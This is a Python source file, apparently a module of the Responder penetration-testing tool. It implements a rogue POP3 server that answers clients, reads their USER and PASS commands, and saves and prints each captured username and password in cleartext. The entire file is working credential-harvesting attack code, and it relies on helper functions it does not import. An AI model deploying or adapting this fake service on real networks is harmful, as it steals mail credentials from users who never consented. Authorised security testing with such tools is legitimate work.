import os
import settings

from SocketServer import BaseRequestHandler
from packets import POPOKPacket

# POP3 Server class
class POP3(BaseRequestHandler):

	def SendPacketAndRead(self):
		Packet = POPOKPacket()
		self.request.send(str(Packet))
		data = self.request.recv(1024)

		return data

	def handle(self):
		try:
			data = self.SendPacketAndRead()

			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				data = self.SendPacketAndRead()

			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "POP3-Clear-Text-Password-%s.txt" % self.client_address[0])
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)

				text("[POP3] Address  : %s" % self.client_address[0])
				text("[POP3] Username : %s" % User)
				text("[POP3] Password : %s" % Pass)

				data = self.SendPacketAndRead()

			else :
				data = self.SendPacketAndRead()

		except Exception:
			pass